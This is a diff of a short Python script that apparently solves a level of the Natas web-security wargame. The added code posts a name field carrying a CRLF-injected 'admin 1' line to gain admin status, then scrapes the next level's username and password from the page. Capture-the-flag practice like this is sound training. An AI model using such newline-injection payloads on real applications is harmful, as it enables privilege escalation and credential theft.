@@ -1,7 +1,6 @@
-#
+# PHP Source Code Analysis
 
 import re
-import threading
 import requests
 import colorama
 from bs4 import BeautifulSoup
@@ -26,6 +25,10 @@ session = requests.Session()
 session.auth = (username, password)
 
 
-resp = session.get(url)
+data = {"name": "natas22\r\nadmin 1"}
+session.post(url, data=data)
+resp = session.post(url, data=data)
 
-print(resp.text)
+soup = BeautifulSoup(resp.text, "lxml")
+print(f"Username: {re.search('Username: (.*)', resp.text).group(1)}")
+print(f"Password: {re.search('Password: (.*)</pre>', resp.text).group(1)}")
